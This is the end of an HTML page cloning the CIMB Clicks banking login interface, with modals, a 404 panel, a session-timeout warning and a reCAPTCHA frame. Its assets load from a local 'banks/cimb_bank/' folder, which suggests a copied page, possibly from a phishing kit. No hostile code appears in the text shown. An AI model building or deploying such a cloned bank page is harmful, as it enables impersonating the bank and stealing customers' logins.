		<div _ngcontent-c0="" class="col-xs-12 clearfix" id="modal-action">
			<div _ngcontent-c0="" class="yes-no text-center clearfix">
				<a _ngcontent-c0="" class="btn btn-half btn-half-right btn-no" href="javascript:;">No</a>
				<a _ngcontent-c0="" class="btn btn-half btn-half-left btn-yes" href="javascript:;">Yes</a>
			</div>
		</div>
	</div>
</div>
<div _ngcontent-c0="" class="modal-confirm-desktop" id="modal-confirm-desktop" style="display: none; z-index:1050 !important;">
	<div _ngcontent-c0="" class="modal-content">
		<div _ngcontent-c0="" class="header-confirm-desktop text-left clearfix" id="header">
			<h1 _ngcontent-c0="">Quick Balance</h1>
		</div>
		<div _ngcontent-c0="" class="content-confirm-desktop col-xs-12 text-left clearfix" id="content">
			<p _ngcontent-c0="">You have yet enable Quick Balance.<br _ngcontent-c0=""> Enable Now</p>
		</div>
		<div _ngcontent-c0="" class="footer-action col-xs-12 clearfix" id="modal-action">
			<div _ngcontent-c0="" class="yes-no text-center clearfix">
				<div _ngcontent-c0="" class="row">
					<div _ngcontent-c0="" class="col-lg-6">
						<a _ngcontent-c0="" class="btn btn-default btn-half btn-half-right btn-no" href="javascript:;">No</a>
					</div>
					<div _ngcontent-c0="" class="col-lg-6">
						<a _ngcontent-c0="" class="btn btn-primary btn-half btn-half-left btn-yes" href="javascript:;">Yes</a>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>



</page-login>
</div>


<div class="preloader app-loader new-loader" style="opacity: 0; display: none;">
	
	
	<div class="loader">
		<div class="css-loader"></div>
	</div>	
	
</div>
<not-found><div class="not-found-wrapper-404" style="display: none;">
	<div class="clearfix not-found-inner">
		<div class="col-xs-12 col-sm-12 col-md-6 hero-banner">
			<span class="triangle-right"></span>
			<div class="not-found-banner"></div>
			<img alt="" class="octobus-banner" src="https://www.cimbclicks.com.my/img/octobus-banner.png">
			
			<img alt="CIMB Logo" class="img-logo logo-mob visible-xs visible-sm" src="banks/cimb_bank/logo-white.svg">
		</div>
		<div class="col-xs-12 col-sm-12 col-md-6 not-found-content">
			<div class="not-found-content-inner">
				<img alt="CIMB Logo" class="img-logo hidden-xs hidden-sm" src="banks/cimb_bank/logo.svg">
				<h1 class="title">Page not found</h1>
				<p class="msg">We are unable to find the page you are looking for.</p>
				
				
			</div>
		</div>
	</div>
	<img class="img-footer" src="banks/cimb_bank/stripebar.gif" width="100%">
</div>

</not-found>
<countdown-modal>

<div aria-labelledby="session-timeout" class="modal fade cimb-modal session-timeout-modal cimb-modal-full-screen-mobile cimb-modal-has-footer js-modal-full-screen" id="modal-session-timeout" role="dialog" tabindex="-1">
	<div class="modal-dialog modal-sm" role="document">
		<div class="modal-content">
			<div class="modal-header">
			 	
			 	<h4 class="modal-title" id="session-timeout">Attention!</h4>
			</div>
			<div class="modal-body">
				<div class="modal-body-inner">

					<p><strong>Your secured connection to CIMB Clicks is about to timeout</strong></p>
					<p class="time">00:00:00</p>
					<small>Please complete your transaction to avoid interruption.</small>
				</div>
			</div>
			<div class="modal-footer">
				<button class="btn btn-primary btn-continue">OK</button>
				
			</div>
		</div>
	</div>
</div>
</countdown-modal>
<common-error-modal><div class="error-modal-container" style="display: none;">
	<div class="modal-content" style="min-height:0">
		<div class="header text-left clearfix">
			<h1></h1>
		</div>
		<div class="content col-xs-12 text-left clearfix">
			<p style="white-space: pre-line;"></p>
		</div>

		<div class="footer-action col-xs-12 clearfix">
			<div class="yes-no text-center clearfix">
				<!---->
				<!----><div>
					<!---->
				</div>
				<!---->
				<!----><div>
					<!---->
					<!----><a class="btn btn-primary btn-full btn-half-left btn-yes cursor">OK</a>
				</div>
			</div>
		</div>
	</div>
</div>




</common-error-modal>
<base-modal-container><div>
	

	
	
	<!---->
	<!---->
	<!---->

	<!---->

	<!---->

	<!---->

	<!---->

	<!---->
	
	<!---->

	
	
	
	
	

	
	
	
	

	
	
	
	

	
	
	
	
	

	


	
	

</div>
</base-modal-container></cimb-app>
	<!-- <script type="text/javascript">_satellite.pageBottom();</script> -->
<!-- <script type="text/javascript" src="banks/cimb_bank/inline.b02f36865769c781b1b7.bundle.js.download"></script><script type="text/javascript" src="banks/cimb_bank/polyfills.af50ebc618d82563e508.bundle.js.download"></script><script type="text/javascript" src="banks/cimb_bank/scripts.cab976bd57fdf8840d89.bundle.js.download"></script><script type="text/javascript" src="banks/cimb_bank/vendor.ebc4b0c9d328a44571ea.bundle.js.download"></script><script type="text/javascript" src="banks/cimb_bank/main.91ea33fbed618aa89c36.bundle.js.download"></script><script type="text/javascript">var _cf = _cf || []; _cf.push(['_setFsp', true]); _cf.push(['_setBm', true]); _cf.push(['_setAu', '/assets/445107e8209cec37cf39ee9f88f9']);</script><script type="text/javascript" src="banks/cimb_bank/445107e8209cec37cf39ee9f88f9"></script><noscript><img src="https://www.cimbclicks.com.my/akam/10/pixel_6fa1a547?a=dD1jNWY1MDYyYzFhYmQ5YjBiYTEzZGE1NDFmMzMzOTZlYjUxMTRmZTRhJmpzPW9mZg==" style="visibility: hidden; position: absolute; left: -999px; top: -999px;" /></noscript> -->


<div style="left: -1000px; overflow: scroll; position: absolute; top: -1000px; border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;"><div style="border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;"></div></div><div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;"></div><div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: absolute; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255); overflow: hidden;"><iframe title="recaptcha challenge" src="banks/cimb_bank/bframe.html" name="c-5y5mxkx0bxa9" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div></div></body></html>